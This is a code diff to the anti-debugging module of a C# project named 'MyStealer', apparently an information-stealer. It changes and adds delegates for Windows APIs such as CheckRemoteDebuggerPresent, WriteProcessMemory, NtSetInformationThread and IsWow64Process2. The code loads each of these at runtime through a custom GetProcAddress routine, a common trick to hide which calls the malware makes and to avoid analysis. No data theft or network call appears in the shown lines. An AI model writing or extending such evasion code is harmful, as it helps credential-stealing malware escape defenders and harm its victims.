@@ -1,7 +1,7 @@
 ﻿using System.Runtime.InteropServices;
 using System;
 using System.Text;
-using static MyStealer.AntiDebug.NativeCalls;
+using Microsoft.Win32.SafeHandles;
 
 namespace MyStealer.AntiDebug
 {
@@ -21,10 +21,10 @@ namespace MyStealer.AntiDebug
         internal delegate bool DIsDebuggerPresent();
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-        internal delegate bool DCheckRemoteDebuggerPresent(IntPtr Handle, ref bool CheckBool);
+        internal delegate bool DCheckRemoteDebuggerPresent(SafeProcessHandle processHandle, out bool CheckBool);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-        internal delegate bool DWriteProcessMemory(SafeHandle ProcHandle, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);
+        internal delegate bool DWriteProcessMemory(SafeProcessHandle ProcHandle, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate IntPtr DOpenThread(uint DesiredAccess, bool InheritHandle, int ThreadId);
@@ -45,7 +45,7 @@ namespace MyStealer.AntiDebug
         internal delegate int DQueryFullProcessImageNameA(SafeHandle hProcess, uint Flags, byte[] lpExeName, int[] lpdwSize);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-        internal delegate bool DIsProcessCritical(IntPtr Handle, ref bool BoolToCheck);
+        internal delegate bool DIsProcessCritical(SafeProcessHandle Handle, ref bool BoolToCheck);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate IntPtr DGetModuleHandleA(string name);
@@ -59,13 +59,19 @@ namespace MyStealer.AntiDebug
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate uint DGetModuleFileNameW(IntPtr module, StringBuilder fileName, uint size);
 
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate bool DCloseHandle(IntPtr handle);
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate bool DIsWow64Process2(IntPtr process, out uint processMachine, out uint nativeMatchine);
+
         // user32
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate IntPtr DGetForegroundWindow();
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-        internal delegate int DGetWindowTextLengthA(IntPtr HWND);
+        internal delegate int DGetWindowTextLengthA(SafeHandle HWND);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate int DGetWindowTextA(IntPtr HWND, StringBuilder WindowText, int nMaxCount);
@@ -76,7 +82,7 @@ namespace MyStealer.AntiDebug
         internal delegate bool DNtClose(IntPtr Handle);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
-        internal delegate uint DNtSetInformationThread(IntPtr ThreadHandle, uint ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);
+        internal delegate uint DNtSetInformationThread(SafeHandle ThreadHandle, uint ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate uint DNtQueryInformationProcess_uint(SafeHandle hProcess, uint ProcessInfoClass, out uint ProcessInfo, uint nSize, uint ReturnLength);
@@ -137,6 +143,10 @@ namespace MyStealer.AntiDebug
 
         internal static DGetModuleFileNameW GetModuleFileNameW { get; private set; }
 
+        internal static DCloseHandle CloseHandle { get; private set; }
+
+        internal static DIsWow64Process2 IsWow64Process2 { get; private set; }
+
         // user32
 
         internal static DGetForegroundWindow GetForegroundWindow { get; private set; }
@@ -188,6 +198,8 @@ namespace MyStealer.AntiDebug
             OpenProcess = Marshal.GetDelegateForFunctionPointer<DOpenProcess>(MyGetProcAddress(kernel32, "OpenProcess"));
             CreateFileW = Marshal.GetDelegateForFunctionPointer<DCreateFileW>(MyGetProcAddress(kernel32, "CreateFileW"));
             GetModuleFileNameW = Marshal.GetDelegateForFunctionPointer<DGetModuleFileNameW>(MyGetProcAddress(kernel32, "GetModuleFileNameW"));
+            CloseHandle = Marshal.GetDelegateForFunctionPointer<DCloseHandle>(MyGetProcAddress(kernel32, "CloseHandle"));
+            IsWow64Process2 = Marshal.GetDelegateForFunctionPointer<DIsWow64Process2>(MyGetProcAddress(kernel32, "IsWow64Process2"));
 
             // user32
             var user32 = LoadLibrary("user32.dll"); // user32 is not loaded by default
